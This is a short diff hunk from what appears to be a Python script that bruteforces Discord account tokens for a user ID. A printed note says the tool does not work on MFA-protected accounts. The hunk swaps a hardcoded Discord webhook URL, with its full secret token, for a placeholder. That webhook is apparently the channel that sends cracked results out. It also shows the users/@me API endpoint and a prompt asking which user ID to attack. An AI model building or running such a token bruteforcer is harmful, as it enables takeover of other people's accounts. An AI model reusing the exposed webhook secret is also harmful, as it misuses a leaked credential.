@@ -23,7 +23,7 @@ print("NOTE: this bruteforcer does NOT work with MFA tokens, those seem to have 
 
 
 # --- VARIABLES ---
-WEBHOOK_URL = "https://discord.com/api/webhooks/921477455888392232/sppRZWXoC-iJSWdoG-WCKw50QvM4tV3lYnyhcUl-ISoCWRHT5DEb6cwU-5gjWVnMeo94"
+WEBHOOK_URL = "YOUR_WEBHOOK_GOES_HERE"
 URL = 'https://discordapp.com/api/users/@me'
 valid_or_not = None
 userid = input('UserID to bruteforce: ')
